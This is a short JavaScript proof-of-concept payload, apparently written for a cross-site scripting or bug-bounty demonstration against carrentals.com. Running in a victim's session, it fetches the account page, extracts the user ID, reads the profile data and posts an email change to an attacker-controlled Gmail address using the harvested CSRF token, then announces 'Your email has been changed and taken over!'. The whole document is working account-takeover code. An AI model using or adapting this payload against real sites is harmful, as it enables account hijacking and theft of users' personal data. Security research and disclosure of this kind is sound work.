await fetch("https://www.carrentals.com/user/account", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin"
    },
    "method": "GET",
    "mode": "cors"
}).then(a => a.text()).then(d => {
    let uid_regex = /"tuid":(\d+),/gi;
    let uid = uid_regex.exec(d)[1];
    fetch(`https://www.carrentals.com/users/${uid}/profile`, {
        "credentials": "include",
        "headers": {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "X-Requested-With": "XMLHttpRequest",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin"
        },
        "referrer": "https://www.carrentals.com/user/account",
        "method": "GET",
        "mode": "cors"
    }).then(a => a.json()).then(d => {
        alert(`Got your information: ${JSON.stringify(d)}`);
        fetch(`https://www.carrentals.com/users/${uid}/updateemail`, {
            "credentials": "include",
            "headers": {
                "Content-Type": "application/json",
            },
            "referrer": "https://www.carrentals.com/user/account",
            "body": "{\"newEmail\":\"pentestai31+hijack@gmail.com\",\"hiddenNewEmail\":\"pentestai31+hijack@gmail.com\",\"unsubscribe_on_updateEmail\":\"false\",\"confirmNewEmail\":\"pentestai31+hijack@gmail.com\",\"csrfToken\":\"" + d.csrfToken + "\"}",
            "method": "POST",
            "mode": "cors"
        }).then(a => alert('Your email has been changed and taken over!'))
    })
})
